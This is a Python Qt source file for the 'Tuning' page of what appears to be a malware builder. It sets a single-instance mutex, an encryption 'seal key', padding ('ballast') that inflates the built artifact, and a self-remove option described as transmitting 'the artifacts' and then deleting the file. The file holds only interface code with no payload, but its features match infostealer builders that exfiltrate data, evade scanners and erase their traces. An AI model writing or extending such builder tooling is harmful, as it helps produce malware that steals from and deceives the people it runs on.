"""Tuning page: mutex, seal key, self-remove, ballast, output directory.

``ballast_mb`` is clamped here to ``MAX_BALLAST_MB`` from the schema, because a spin box
with a range of its own would be a second opinion about a number the schema already
bounds. The ceiling is read from ``core.schema`` and never written down twice.

The seal key field is masked and has a reveal toggle. It is not kept in ``QSettings``:
the archive is sealed with whatever is in the box at build time, and a key remembered
between sessions is a key on disk that nobody asked to be there. The mutex and the
output directory are remembered, because both are ordinary preferences.

``self_remove`` carries a warning line of its own, because it is the one setting that
deletes the artifact after it runs and there is no undo.
"""

from __future__ import annotations

import secrets
from typing import Final

from PySide6.QtCore import QSettings, Qt
from PySide6.QtWidgets import (
    QCheckBox,
    QHBoxLayout,
    QLabel,
    QPushButton,
    QSpinBox,
    QVBoxLayout,
    QWidget,
)

from core.schema import MAX_BALLAST_MB

from ..widgets.field import LabelledEdit

__all__ = ["TuningPage", "generate_key"]

_DEFAULT_MUTEX: Final[str] = "Global\\SableRun"
_MIN_KEY_LENGTH: Final[int] = 12

_MUTEX_KEY: Final[str] = "form/mutex"
_OUTPUT_KEY: Final[str] = "form/output"


def generate_key(length: int = 32) -> str:
    """A fresh seal key. Hex, so it survives every parser and every shell."""
    return secrets.token_hex(length // 2)


class TuningPage(QWidget):
    """Mutex name, seal key, self-remove, ballast and the output directory."""

    title: Final[str] = "Tuning"
    description: Final[str] = "Runtime names, padding and where the build lands."

    def __init__(self, parent: QWidget | None = None) -> None:
        super().__init__(parent)

        self._mutex = LabelledEdit("Mutex name", text=_DEFAULT_MUTEX)
        self._seal_key = LabelledEdit("Seal key", placeholder=f"at least {_MIN_KEY_LENGTH} characters")
        self._seal_key._edit.setEchoMode(self._seal_key._edit.EchoMode.Password)

        self._reveal = QPushButton("Show")
        self._reveal.setCheckable(True)
        self._reveal.setObjectName("reveal")
        self._reveal.toggled.connect(self._on_reveal)

        self._generate = QPushButton("Generate")
        self._generate.setObjectName("generate")
        self._generate.clicked.connect(self._on_generate)

        buttons = QWidget()
        button_row = QHBoxLayout(buttons)
        button_row.setContentsMargins(0, 0, 0, 0)
        button_row.setSpacing(8)
        button_row.addWidget(self._reveal)
        button_row.addWidget(self._generate)
        button_row.addStretch(1)

        self._self_remove = QCheckBox("Delete the artifact after it runs")
        self._self_remove.setObjectName("selfRemove")
        self._self_remove_note = QLabel(
            "The artifacts are transmitted, then the file removes itself. No undo."
        )
        self._self_remove_note.setObjectName("hint")
        self._self_remove_note.setWordWrap(True)

        self._ballast = QSpinBox()
        self._ballast.setObjectName("ballast")
        self._ballast.setRange(0, MAX_BALLAST_MB)
        self._ballast.setSingleStep(64)
        self._ballast.setSuffix(" MB")
        self._ballast.setValue(0)

        self._output = LabelledEdit(
            "Output directory", placeholder="where the finished artifact is written", browse=True
        )
        self._output.set_text(str(QSettings().value(_OUTPUT_KEY, "")))

        ballast_label = QLabel("Ballast")
        ballast_label.setObjectName("fieldLabel")
        ballast_note = QLabel(
            f"Padding appended to the artifact. 0 to {MAX_BALLAST_MB} MB, whole numbers."
        )
        ballast_note.setObjectName("hint")
        ballast_note.setWordWrap(True)

        column = QVBoxLayout(self)
        column.setContentsMargins(0, 0, 0, 0)
        column.setSpacing(12)
        column.addWidget(self._mutex)
        column.addWidget(self._seal_key)
        column.addWidget(buttons)
        column.addWidget(ballast_label)
        column.addWidget(self._ballast)
        column.addWidget(ballast_note)
        column.addWidget(self._self_remove)
        column.addWidget(self._self_remove_note)
        column.addWidget(self._output)
        column.addStretch(1)

        self._mutex.changed.connect(self._remember_mutex)
        self._output.changed.connect(self._remember_output)

    # --- value ---------------------------------------------------------------

    def values(self) -> dict[str, object]:
        return {
            "mutex": self._mutex.text().strip(),
            "seal_key": self._seal_key.text(),
            "self_remove": self._self_remove.isChecked(),
            "ballast_mb": int(self._ballast.value()),
            "out_dir": self._output.text().strip(),
        }

    def reset(self) -> None:
        self._mutex.set_text(_DEFAULT_MUTEX)
        self._seal_key.set_text("")
        self._self_remove.setChecked(False)
        self._ballast.setValue(0)
        self._mutex.clear_problem()
        self._seal_key.clear_problem()
        self._output.clear_problem()

    # --- state ---------------------------------------------------------------

    def show_problems(self, problems) -> None:
        for problem in problems:
            if problem.path == "mutex":
                self._mutex.set_problem(problem.message)
            elif problem.path == "seal_key":
                self._seal_key.set_problem(problem.message)
            elif problem.path == "ballast_mb":
                self._ballast.setToolTip(problem.message)

    # --- internals -----------------------------------------------------------

    def _on_reveal(self, revealed: bool) -> None:
        mode = self._seal_key._edit.EchoMode
        self._seal_key._edit.setEchoMode(mode.Normal if revealed else mode.Password)
        self._reveal.setText("Hide" if revealed else "Show")

    def _on_generate(self) -> None:
        self._seal_key.set_text(generate_key())
        self._seal_key.clear_problem()

    def _remember_mutex(self, value: str) -> None:
        settings = QSettings()
        settings.setValue(_MUTEX_KEY, value)

    def _remember_output(self, value: str) -> None:
        settings = QSettings()
        settings.setValue(_OUTPUT_KEY, value)
